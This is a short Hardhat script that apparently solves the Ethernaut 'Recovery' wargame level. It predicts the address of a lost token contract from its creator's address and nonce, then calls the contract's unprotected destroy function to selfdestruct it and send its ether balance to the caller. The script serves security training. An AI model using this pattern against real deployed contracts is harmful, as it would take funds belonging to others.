const { ethers } = require("hardhat");
const Runner = require("./lib/runner");
const utils = require("./lib/utils");

Runner.run(async (provider, owner) => {
    
    //PLACE THE Recovery CONTRACT ADDRESS HERE (Ethernaut: contract.address)    
    const recoveryAddr = "0x9281D32c3Da999D1c7d7AAcD4fE52611c4bd097F";     
    
    //calculate the token contract adddress 
	const tokenAddr = utils.predictContractAddress(recoveryAddr, 0);
			
    console.log("* * * ");
    console.log(`Recovered token address is ${tokenAddr}`); 
    
    //get the contract at that address 
    const tokenContract = await ethers.getContractAt("SimpleToken", tokenAddr); 
    
    //get the balance
    console.log(`Token contract has a balance of ${await provider.getBalance(tokenAddr)}`);
    
    //destroy it
    console.log(`destroying token to ${owner.address}...`);
    await tokenContract.destroy(owner.address); 
    
    //get the balance
    console.log(`Token contract now has a balance of ${await provider.getBalance(tokenAddr)}`);
    
    console.log("* * * ");
});
